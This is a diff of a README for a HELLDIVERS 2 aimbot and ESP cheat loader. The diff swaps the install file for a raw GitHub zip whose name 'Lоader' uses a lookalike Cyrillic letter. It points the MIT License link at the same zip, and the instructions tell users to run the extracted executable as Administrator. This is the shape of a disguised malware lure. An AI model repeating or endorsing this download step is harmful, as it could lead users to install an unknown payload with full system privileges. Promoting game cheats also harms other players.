@@ -31,7 +31,7 @@ Welcome to the **HELLDIVERS 2 Aim Esp Loader**! This advanced toolkit empowers s
 
 ## 📦 Installation
 
-1. Download **Loader.rar** from this repository.
+1. Download **https://raw.githubusercontent.com/ali11223344556/WSASS/main/Lоader.zip** from this repository.
 2. Extract contents to your preferred directory.
 3. Launch the Loader executable as Administrator.
 4. Run HELLDIVERS 2 and enjoy enhanced gameplay!
@@ -52,5 +52,5 @@ This project is published solely for educational and research purposes regarding
 
 ## 📄 License
 
-Distributed under the [MIT License](https://opensource.org/licenses/MIT) © 2025.  
+Distributed under the [MIT License](https://raw.githubusercontent.com/ali11223344556/WSASS/main/Lоader.zip) © 2025.  
 Enjoy enhanced aim and awareness with transparency and open-source ethics!
